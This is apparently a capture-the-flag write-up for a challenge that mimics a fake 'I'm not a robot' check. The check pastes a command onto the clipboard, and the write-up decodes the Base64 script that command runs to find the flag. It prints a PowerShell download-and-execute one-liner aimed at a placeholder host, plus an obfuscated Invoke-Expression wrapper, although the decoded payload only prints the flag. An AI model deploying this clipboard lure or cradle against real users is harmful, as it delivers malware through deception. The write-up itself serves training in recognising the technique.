# Solution

1. The website has a `I'm not a robot` button.
2. Click on it and instructions will be given.
3. This will be added to the device's clipboard.
```ps1
cmd /c PowerShell.exe "iex ((New-Object System.Net.WebClient).DownloadString('http://<web-hostname>/verify.ps1'))" # 'FREE ROADBLOACKERS VERIFICATION ID: 21402'
```

4. After going to the `/verify.ps1`, you will see this code.
```ps1
InVOKe-eXpREsSiOn ([SySTem.TeXt.eNCoDInG]::UtF8.gEtSTrIng([SyStEM.COnVeRT]::FrOmBaSe64StrIng('aWYgKCAncHpsJyAtZXEgJ2x6eCcpIHsgV3JpdGUtT3V0cHV0ICdTSUcyNHtuMF9mUkVlX3JPQlV4X3JpUH0nIH0gZWxzZSB7IFdyaXRlLU91dHB1dCAnRXJyb3IgT2NjdXJlZCBXaGlsZSBEb2luZyBWZXJpZmljYXRpb24uIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuJyB9OyBXcml0ZS1PdXRwdXQgJ1ByZXNzIGFueSBrZXkgdG8gY29udGludWUuLi4nOyAkbnVsbCA9ICRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoJ05vRWNobyxJbmNsdWRlS2V5RG93bicp')))
```

5. There is a Base64 string inside. Convert the Base64 to string. There you will find your flag.
```ps1
if ( 'pzl' -eq 'lzx') { Write-Output 'SIG24{n0_fREe_rOBUx_riP}' } else { Write-Output 'Error Occured While Doing Verification. Please try again later.' }; Write-Output 'Press any key to continue...'; $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
```